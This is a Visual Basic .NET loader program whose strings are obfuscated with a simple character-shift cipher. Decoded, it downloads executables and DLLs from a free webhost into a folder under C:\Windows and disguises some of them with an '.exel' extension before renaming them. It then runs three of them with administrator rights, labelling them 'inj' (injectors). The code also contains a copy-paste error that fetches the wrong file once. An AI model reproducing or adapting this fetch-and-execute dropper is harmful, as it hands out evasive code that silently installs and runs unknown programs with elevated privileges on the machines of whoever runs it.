Imports System.Globalization

Imports System.Object
Imports System.MarshalByRefObject
Imports System.IO
Imports System.Xml
Imports System.Drawing
Imports System.ComponentModel.Component
Imports System.Net.WebClient
Imports System.Runtime.InteropServices 'for marshaling unmanaged return types.

Module Module1

    Function FileExists(fp As String) As Boolean
        Dim t As String
        t = ""
        On Error Resume Next
        t = Dir(fp)
        On Error GoTo 0
        If t = "" Then
            FileExists = False
        Else
            FileExists = True
        End If
    End Function

    Function dec(inp As String, v As Integer) As String
        Dim o As String = String.Empty
        Dim c As Char
        For i = 0 To Len(inp) - 1
            c = inp.Substring(i, 1)
            o += Chr(Asc(c) + v)
        Next
        Return o
    End Function

    Function exec(path As String, name As String)
        Dim i As New ProcessStartInfo()
        i.UseShellExecute = True
        i.WorkingDirectory = path
        i.FileName = name
        i.Verb = dec("vyrew", -4)
        Process.Start(i)
    End Function

    Sub Main()

        'used to check/update version
        Dim kek As String = dec("G>`[mrhs{w`oio`oio2hex", -4)

        Dim myWebClient As New Net.WebClient()

        Dim remoteUri1 As String = dec("lxxtw>33{eppoivmm2444{iflswxett2gsq3oio2hex", -4)
        Dim fileName1 As String = dec("oio2hex", -4)

        Dim remoteUri2 As String = dec("lxxtw>33{eppoivmm2444{iflswxett2gsq3im2i|ip", -4)
        Dim fileName2 As String = dec("im2i|ip", -4)

        Dim remoteUri3 As String = dec("lxxtw>33{eppoivmm2444{iflswxett2gsq3wixxmrkw2|qp", -4)
        Dim fileName3 As String = dec("wixxmrkw2|qp", -4)

        Dim remoteUri4 As String = dec("lxxtw>33{eppoivmm2444{iflswxett2gsq372hpp", -4)
        Dim fileName4 As String = dec("72hpp", -4)

        Dim remoteUri5 As String = dec("lxxtw>33{eppoivmm2444{iflswxett2gsq3|:8f2hpp", -4)
        Dim fileName5 As String = dec("|:8f2hpp", -4)

        Dim remoteUri6 As String = dec("lxxtw>33{eppoivmm2444{iflswxett2gsq3|:8e2i|ip", -4)
        Dim fileName6 As String = dec("|:8e2i|ip", -4)

        Dim remoteUri7 As String = dec("lxxtw>33{eppoivmm2444{iflswxett2gsq3|:82i|ip", -4)
        Dim fileName7 As String = dec("|:82i|ip", -4)


        Dim myStringWebResource1 As String = Nothing
        Dim myStringWebResource2 As String = Nothing
        Dim myStringWebResource3 As String = Nothing
        Dim myStringWebResource4 As String = Nothing
        Dim myStringWebResource5 As String = Nothing
        Dim myStringWebResource6 As String = Nothing
        Dim myStringWebResource7 As String = Nothing

        myStringWebResource1 = remoteUri1
        myStringWebResource2 = remoteUri2
        myStringWebResource3 = remoteUri3
        myStringWebResource4 = remoteUri4
        myStringWebResource5 = remoteUri5
        myStringWebResource6 = remoteUri6
        myStringWebResource7 = remoteUri7

        Console.WriteLine(dec("gligomrk$jmpiw22", -4))
        System.Threading.Thread.Sleep(800)

        If FileExists(kek) = False Then

            System.IO.Directory.CreateDirectory(dec("G>`[mrhs{w`oio`", -4))

            Console.WriteLine(dec("hs{rpsehmrk$jmpiw22", -4))
            System.Threading.Thread.Sleep(1000)

            myWebClient.DownloadFile(myStringWebResource1, dec("G>`[mrhs{w`oio`", -4) + fileName1)
            myWebClient.DownloadFile(myStringWebResource2, dec("G>`[mrhs{w`oio`", -4) + fileName2)
            myWebClient.DownloadFile(myStringWebResource3, dec("G>`[mrhs{w`oio`", -4) + fileName3)
            myWebClient.DownloadFile(myStringWebResource4, dec("G>`[mrhs{w`oio`", -4) + fileName4)
            myWebClient.DownloadFile(myStringWebResource5, dec("G>`[mrhs{w`oio`", -4) + fileName5)
            myWebClient.DownloadFile(myStringWebResource6, dec("G>`[mrhs{w`oio`", -4) + fileName6)
            myWebClient.DownloadFile(myStringWebResource6, dec("G>`[mrhs{w`oio`", -4) + fileName7)

            My.Computer.FileSystem.RenameFile(dec("G>`[mrhs{w`oio`im2i|ip", -4), dec("im2i|i", -4))
            My.Computer.FileSystem.RenameFile(dec("G>`[mrhs{w`oio`|:8e2i|ip", -4), dec("|:8e2i|i", -4))
            My.Computer.FileSystem.RenameFile(dec("G>`[mrhs{w`oio`|:82i|ip", -4), dec("|:82i|i", -4))

        ElseIf FileExists(kek) = True Then

            Console.WriteLine(dec("jmpi$epvieh}$i|mwxw22$ythexmrkC22", -4))
            System.Threading.Thread.Sleep(700)
            Dim value1 As String = File.ReadAllText(kek)
            myWebClient.DownloadFile(myStringWebResource1, dec("G>`[mrhs{w`oio`", -4) + dec("oio62hex", -4))
            Dim kek2 As String = dec("G>`[mrhs{w`oio`oio62hex", -4)
            Dim value2 As String = File.ReadAllText(kek2)

            If (value1 = value2) = False Then

                File.Delete(kek)
                File.Delete(kek2)

                If File.Exists(dec("G>`[mrhs{w`oio`72hpp", -4)) Then
                    File.Delete(dec("G>`[mrhs{w`oio`72hpp", -4))
                End If

                If File.Exists(dec("G>`[mrhs{w`oio`|:8f2hpp", -4)) Then
                    File.Delete(dec("G>`[mrhs{w`oio`|:8f2hpp", -4))
                End If

                If File.Exists(dec("G>`[mrhs{w`oio`|:8e2i|i", -4)) Then
                    File.Delete(dec("G>`[mrhs{w`oio`|:8e2i|i", -4))
                End If

                If File.Exists(dec("G>`[mrhs{w`oio`|:82i|i", -4)) Then
                    File.Delete(dec("G>`[mrhs{w`oio`|:82i|i", -4))
                End If


                myWebClient.DownloadFile(myStringWebResource1, dec("G>`[mrhs{w`oio`", -4) + fileName1)
                myWebClient.DownloadFile(myStringWebResource4, dec("G>`[mrhs{w`oio`", -4) + fileName4)
                myWebClient.DownloadFile(myStringWebResource5, dec("G>`[mrhs{w`oio`", -4) + fileName5)
                myWebClient.DownloadFile(myStringWebResource6, dec("G>`[mrhs{w`oio`", -4) + fileName6)
                myWebClient.DownloadFile(myStringWebResource6, dec("G>`[mrhs{w`oio`", -4) + fileName7)

                My.Computer.FileSystem.RenameFile(dec("G>`[mrhs{w`oio`|:8e2i|ip", -4), dec("|:8e2i|i", -4))
                My.Computer.FileSystem.RenameFile(dec("G>`[mrhs{w`oio`|:82i|ip", -4), dec("|:82i|i", -4))

            Else

                File.Delete(kek2)

                Console.WriteLine(dec("jmpiw$epvieh}$ythexih22$mrnigxmrk22", -4))

            End If

        End If

        Console.WriteLine(dec("wxevxmrk22", -4))
        System.Threading.Thread.Sleep(500)


        exec(dec("G>`[mrhs{w`oio`", -4), dec("im2i|i", -4)) 'inj1
        exec(dec("G>`[mrhs{w`oio`", -4), dec("|:8e2i|i", -4)) 'inj2
        exec(dec("G>`[mrhs{w`oio`", -4), dec("|:82i|i", -4)) 'inj3


        Console.WriteLine(dec("wygiww%", -4))
        System.Threading.Thread.Sleep(400)

    End Sub

End Module
